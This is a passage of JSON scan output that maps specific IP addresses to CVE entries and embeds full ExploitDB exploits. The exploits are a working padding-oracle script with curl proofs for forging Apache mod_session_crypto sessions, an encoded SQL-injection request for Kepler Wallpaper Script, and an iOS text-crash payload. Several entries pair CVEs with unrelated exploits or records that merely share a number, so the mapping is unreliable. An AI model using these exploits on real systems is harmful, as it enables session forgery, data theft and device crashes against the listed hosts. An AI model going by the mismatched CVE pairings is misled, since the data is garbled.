                "code": "'''\r\nAdvisory: Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\n'''\r\n\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n\r\n'''\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests performed by a\r\nteam of specialised IT-security experts. Hereby, security weaknesses in\r\ncompany networks or products are uncovered and can be fixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity-related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at:\r\nhttps://www.redteam-pentesting.de/\r\n'''",
                "description": "Apache mod_session_crypto - Padding Oracle",
                "author": "RedTeam Pentesting GmbH",
                "_id": 40961,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-12-23T00:00:00+00:00",
                "cve": [
                    "CVE-2016-0736"
                ],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2015-3185": [
            {
                "source": "CVE",
                "_id": "2015-3185",
                "description": "The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.",
                "osvdb": [],
                "bid": [
                    75965
                ],
                "cve": [
                    "CVE-2015-3185"
                ],
                "msb": []
            }
        ],
        "CVE-2015-3184": [
            {
                "source": "CVE",
                "_id": "2015-3184",
                "description": "mod_authz_svn in Apache Subversion 1.7.x before 1.7.21 and 1.8.x before 1.8.14, when using Apache httpd 2.4.x, does not properly restrict anonymous access, which allows remote anonymous users to read hidden files via the path name.",
                "osvdb": [],
                "bid": [
                    76274
                ],
                "cve": [
                    "CVE-2015-3184"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1312": [
            {
                "source": "CVE",
                "_id": "2018-1312",
                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
                "osvdb": [],
                "bid": [
                    103524
                ],
                "cve": [
                    "CVE-2018-1312"
                ],
                "msb": []
            }
        ],
        "CVE-2016-4975": [
            {
                "source": "CVE",
                "_id": "2016-4975",
                "description": "Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the \"Location\" or other outbound header key or value. Fixed in Apache HTTP Server 2.4.25 (Affected 2.4.1-2.4.23). Fixed in Apache HTTP Server 2.2.32 (Affected 2.2.0-2.2.31).",
                "osvdb": [],
                "bid": [
                    105093
                ],
                "cve": [
                    "CVE-2016-4975"
                ],
                "msb": []
            }
        ],
        "CVE-2016-8612": [
            {
                "source": "CVE",
                "_id": "2016-8612",
                "description": "Apache HTTP Server mod_cluster before version httpd 2.4.23 is vulnerable to an Improper Input Validation in the protocol parsing logic in the load balancer resulting in a Segmentation Fault in the serving httpd process.",
                "osvdb": [],
                "bid": [
                    94939
                ],
                "cve": [
                    "CVE-2016-8612"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-8612",
                "description": "A Denial Of Service vulnerability exists when Connected User Experiences and Telemetry Service fails to validate certain function values, aka \"Connected User Experiences and Telemetry Service Denial of Service Vulnerability.\" This affects Windows Server 2016, Windows 10, Windows Server 2019, Windows 10 Servers.",
                "osvdb": [],
                "bid": [
                    106087
                ],
                "cve": [
                    "CVE-2018-8612"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.161": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.163": {},
    "152.1.8.171": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.175": {},
    "152.1.8.178": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.8.179": {},
    "152.1.16.30": {
        "CVE-2020-7069": [],
        "CVE-2018-19052": [
            {
                "source": "CVE",
                "_id": "2018-19052",
                "description": "An issue was discovered in mod_alias_physical_handler in mod_alias.c in lighttpd before 1.4.50. There is potential ../ path traversal of a single directory above an alias target, with a specific mod_alias configuration where the matched alias lacks a trailing '/' character, but the alias target filesystem path does have a trailing '/' character.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-19052"
                ],
                "msb": []
            }
        ],
        "CVE-2019-11048": [
            {
                "source": "CVE",
                "_id": "2019-11048",
                "description": "In PHP versions 7.2.x below 7.2.31, 7.3.x below 7.3.18 and 7.4.x below 7.4.6, when HTTP file uploads are allowed, supplying overly long filenames or field names could lead PHP engine to try to allocate oversized memory storage, hit the memory limit and stop processing the request, without cleaning up temporary files created by upload request. This potentially could lead to accumulation of uncleaned temporary files exhausting the disk space on the target server.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-11048"
                ],
                "msb": []
            }
        ],
        "CVE-2020-7067": []
    },
    "152.1.26.153": {
        "CVE-2019-1559": [
            {
                "source": "CVE",
                "_id": "2019-1559",
                "description": "If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable \"non-stitched\" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
                "osvdb": [],
                "bid": [
                    107174
                ],
                "cve": [
                    "CVE-2019-1559"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection\r\n# Dork: N/A\r\n# Date: 2019-01-19\r\n# Exploit Author: Ihsan Sencan\r\n# Vendor Homepage: https://keplerwallpapers.online/\r\n# Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script\r\n# Version: 1.1\r\n# Category: Webapps\r\n# Tested on: WiN7_x64/KaLiLinuX_x64\r\n# CVE: N/A\r\n\r\n# POC: \r\n# 1)\r\n# http://localhost/[PATH]//[PATH]/category/xxx[SQL]\r\n# \r\n\r\nGET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHTTP/1.1 200 OK\r\nDate: Sat, 19 Jan 2019 09:01:06 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.37\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nStrict-Transport-Security: max-age=31536000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8",
                "description": "Kepler Wallpaper Script 1.1 - SQL Injection",
                "author": "Ihsan Sencan",
                "_id": 46207,
                "source": "ExploitDB",
                "platform": "php",
                "date": "2019-01-21T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 80
            }
        ],
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0118": [
            {
                "source": "CVE",
                "_id": "2014-0118",
                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
                "osvdb": [],
                "bid": [
                    68745
                ],
                "cve": [
                    "CVE-2014-0118"
                ],
                "msb": []
            }
        ],
        "CVE-2021-23840": []
    },
    "152.1.26.180": {
        "CVE-2010-1899": [
            {
                "source": "CVE",
                "_id": "2010-1899",
                "description": "Stack consumption vulnerability in the ASP implementation in Microsoft Internet Information Services (IIS) 5.1, 6.0, 7.0, and 7.5 allows remote attackers to cause a denial of service (daemon outage) via a crafted request, related to asp.dll, aka \"IIS Repeated Parameter Request Denial of Service Vulnerability.\"",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2010-1899"
                ],
                "msb": [
                    "MS10-065"
                ]
            }
        ]
    },
    "152.1.31.58": {
        "CVE-2017-7679": [
            {
                "source": "CVE",
                "_id": "2017-7679",
                "description": "In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_mime can read one byte past the end of a buffer when sending a malicious Content-Type response header.",
                "osvdb": [],
                "bid": [
                    99170
                ],
                "cve": [
                    "CVE-2017-7679"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: TpwnT - iOS Denail of Service POC\r\n# Date: 10-31-2017\r\n# Exploit Author: Russian Otter (Ro)\r\n# Vendor Homepage: https://support.apple.com/en-us/HT208222\r\n# Version: 2.1\r\n# Tested on: iOS 10.3.2 - 11.1\r\n# CVE: CVE-2017-13849\r\n\r\n\"\"\"\r\n-------------------------\r\n     CVE-2017-13849\r\n  TpwnT by Ro of SavSec\r\n-------------------------\r\n\r\nDescription:\r\n\tThread Pwning Text (TpwnT) is maliciously crafted text that affects the iPhone and other Apple devices by exploiting a vulnerability found in the Core-Text firmware which results in a thread crash or extreme application lag!\r\n\r\nRecorded Tests / Results:\r\n\tSignal version 2.14.1 on iOS 10.3.2 (fixed on 2.15.3) users were able to crash conversations by sending the payload which would result in the app crashing when the selected chat was opened.\r\n\t\r\n\tInstagram version 10.25 (fixed on 10.31) on iOS 10.3.2 and resulting in chat thread crashes when the payload was sent which disallowed users to load chat or send messages. When the payload was unsent the chat was fuctional.\r\n\t\r\n\tPythonista 3 on iOS 10.3.2, crashed when displaying multiple sets of TpwnT or while rotating the device.\r\n\t\r\nSummary:\r\n\tWhen displaying the TpwnT Characters on iOS < 11.1 the iPhone may lag intensely or crash on certain apps!\r\n\tThis allows for the possibility of DoS related attacks or application crashing attacks.\r\n\r\nCreator: @Russian_Otter (Ro)\r\nDiscovery: 7-17-2017\r\nDisclosure: 10-31-2017\r\nDisclosure Page: https://support.apple.com/en-us/HT208222\r\n\r\nAffected Devices\r\n\tiPhone 5S iOS < 11.1\r\n\tiPhone 6 & 6S iOS < 11.1\r\n\tiPhone 7 iOS < 11.1\r\n\tiPhone 8 iOS < 11.1\r\n\tiPhone X iOS < 11.1\r\n\tApple TV 4th Generation\r\n\tApple TV 4K 4th Generation\r\n\tiPod Touch 6th Generation\r\n\tiPad Air\r\n\twatchOS < 4.1\r\n\ttvOS < 11.1\r\n\tiOS < 11.1\r\n\r\nTested Devices:\r\n\tiPhone 5S iOS 10.3.2 - 11.1\r\n\tiPhone 6S iOS 10.3.1 - 11.1\r\n\tiPad Mini 2 iOS 10.3.2\r\n\tApple TV 2 tvOS 10\r\n\r\nTested Apps:\r\n\tSignal\r\n\tInstagram\r\n\tSnapchat\r\n\tSafari\r\n\tTanktastic\r\n\tPythonista 3\r\n\tNotepad\r\n\r\n\"\"\"\r\n\r\ntpwnt = \"880 881 883 887 888 975 1159 1275 1276 1277 1278 1302 1304 1305 1306 1311 1313 1314 1316 1317 1318 1319 1322 1323 1324 1325 1326 1327 1328 1543 2304 2405 3073 3559 3585 3586 4091 4183 4184 4353 6366 6798 7679 7680 7837 7930 7932 7933 7934 7935 7936 8343 8344 8345 8346 8347 8348 8349 8376 8381 8382 8383 8384 8524 9136 9169 10215 10216 11153 11374 11377 11381 11390 11392 11746 11747 11748 11749 11750 11751 11752 11753 11754 11755 11756 11757 11758 11759 11760 11761 11762 11763 11764 11765 11766 11767 11768 11769 11771 11772 11773 11774 11775 11776 11811 11813 11814 12295 12344 12357 12686 19971 19975 42560 42562 42563 42564 42565 42566 42567 42568 42569 42570 42571 42572 42573 42574 42575 42576 42577 42578 42579 42580 42581 42583 42584 42585 42587 42588 42589 42590 42591 42592 42594 42595 42596 42597 42598 42599 42600 42601 42602 42603 42604 42605 42606 42608 42609 42610 42611 42612 42613 42614 42615 42616 42617 42619 42620 42621 42622 42623 42624 42625 42627 42628 42629 42630 42632 42633 42634\".split()\r\n\r\npayload = \"\"\r\nfor i in tpwnt:\r\n\ts = unichr(int(i))\r\n\tpayload += s\r\n\r\npayload = bytes(payload)\r\npayload_unicode = unicode(payload)\r\n\r\n# Proof of Concept\r\n# iOS < 11.1 Devices that display these characters should experience lag or crashes while TpwnT is visible\r\n\r\nif raw_input(\"Show Payload [y/n] \") == \"y\":\r\n\tprint payload_unicode",
                "description": "iOS < 11.1 / tvOS < 11.1 / watchOS < 4.1 - Denial of Service",
                "author": "Russian Otter",
                "_id": 43161,
                "source": "ExploitDB",
                "platform": "ios",
                "date": "2017-11-20T00:00:00+00:00",
                "cve": [
                    "CVE-2017-13849"
                ],
                "type": "dos",
                "port": 0
            }
        ],
        "CVE-2016-0736": [
            {
                "source": "CVE",
                "_id": "2016-0736",
                "description": "In Apache HTTP Server versions 2.4.0 to 2.4.23, mod_session_crypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC.",
                "osvdb": [],
                "bid": [
                    95078
                ],
                "cve": [
                    "CVE-2016-0736"
                ],
                "msb": []
            },
            {
                "code": "'''\r\nAdvisory: Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is 